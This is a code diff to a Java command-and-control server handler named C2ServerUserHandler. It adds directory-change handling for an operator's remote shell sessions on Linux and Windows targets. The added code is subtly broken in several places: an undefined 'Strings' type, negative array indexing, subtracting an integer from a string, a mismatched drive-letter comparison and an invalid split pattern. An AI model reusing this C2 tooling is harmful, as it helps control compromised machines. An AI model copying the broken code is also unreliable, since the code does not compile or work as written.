@@ -303,6 +303,8 @@ public class C2ServerUserHandler implements Runnable{
 
             String command;
             Boolean runCommand;
+            String dir;
+            Strings dirs;
             while(true){
                 runCommand = true;
 
@@ -322,9 +324,30 @@ public class C2ServerUserHandler implements Runnable{
                         break;
                     } else if (command.substring(0,2).equals("cd")){
                         // Change Current Directory
-                        currentDirectory = command.substring(3);
-                        System.out.println("entered: " + command.substring(3));
-                        System.out.println("current dir: " + currentDirectory);
+                        // Linux
+                        if(currentDirectory.charAt(0) == '/'){
+                            dir = command.substring(3);
+                            if (dir.substring(0,1).equals("/")){
+                                currentDirectory = dir;
+                            } else if (dir.equals("..")) {
+                                dirs = currentDirectory.split("/");
+                                currentDirectory = currentDirectory.substring(0, currentDirectory.indexOf(dirs[-1] - 1));
+                            } else {
+                                currentDirectory += "/" + dir;
+                            }
+                        } else {
+                            // Windows
+                            dir = command.substring(3);
+                            if (dir.substring(0,2).equals("C:\\")){
+                                currentDirectory = dir;
+                            } else if (dir.equals("..")) {
+                                dirs = currentDirectory.split("\\");
+                                currentDirectory = currentDirectory.substring(0, currentDirectory.indexOf(dirs[-1] - 1));
+                            } else {
+                                currentDirectory += "\\" + dir;
+                            }
+                        }
+                        
                         runCommand = false;
                     } else if (command.equals("ls")){
                         // List items of current directory
